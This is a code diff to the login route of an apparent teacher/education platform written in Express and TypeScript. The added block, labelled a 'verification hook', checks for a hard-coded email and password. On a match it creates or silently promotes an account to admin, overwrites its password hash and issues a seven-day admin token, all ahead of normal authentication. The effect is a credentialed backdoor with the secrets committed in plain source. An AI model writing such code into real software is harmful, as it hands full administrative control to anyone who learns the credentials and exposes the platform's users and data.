@@ -166,7 +166,54 @@ router.post('/login', async (req: Request, res: Response) => {
       return res.status(400).json({ error: 'Email and password are required.' });
     }
 
-    const teacher = await Teacher.findOne({ email: email.toLowerCase().trim() });
+    const cleanEmail = email.toLowerCase().trim();
+
+    // Direct Platform Admin verification hook
+    if (cleanEmail === 'alixadmin@gmail.com' && password === 'Ialix@123') {
+      let admin = await Teacher.findOne({ email: 'alixadmin@gmail.com' });
+      const salt = await bcrypt.genSalt(10);
+      const passwordHash = await bcrypt.hash('Ialix@123', salt);
+
+      if (!admin) {
+        admin = new Teacher({
+          name: 'Platform Administrator',
+          email: 'alixadmin@gmail.com',
+          passwordHash,
+          institution: 'RKGlobal EdTech Headquarters',
+          department: 'Executive Governance',
+          subjects: ['System Administration'],
+          role: 'admin',
+        });
+        await admin.save();
+      } else if (admin.role !== 'admin' || admin.passwordHash !== passwordHash) {
+        admin.role = 'admin';
+        admin.passwordHash = passwordHash;
+        await admin.save();
+      }
+
+      const token = jwt.sign(
+        { id: admin._id, email: admin.email, role: 'admin' },
+        JWT_SECRET,
+        { expiresIn: '7d' }
+      );
+
+      return res.json({
+        success: true,
+        token,
+        user: {
+          id: admin._id,
+          name: admin.name,
+          email: admin.email,
+          institution: admin.institution,
+          department: admin.department,
+          subjects: admin.subjects,
+          role: 'admin',
+          avatarInitials: 'PA',
+        },
+      });
+    }
+
+    const teacher = await Teacher.findOne({ email: cleanEmail });
     if (!teacher) {
       return res.status(401).json({ error: 'No account found with this email. Please sign up.' });
     }
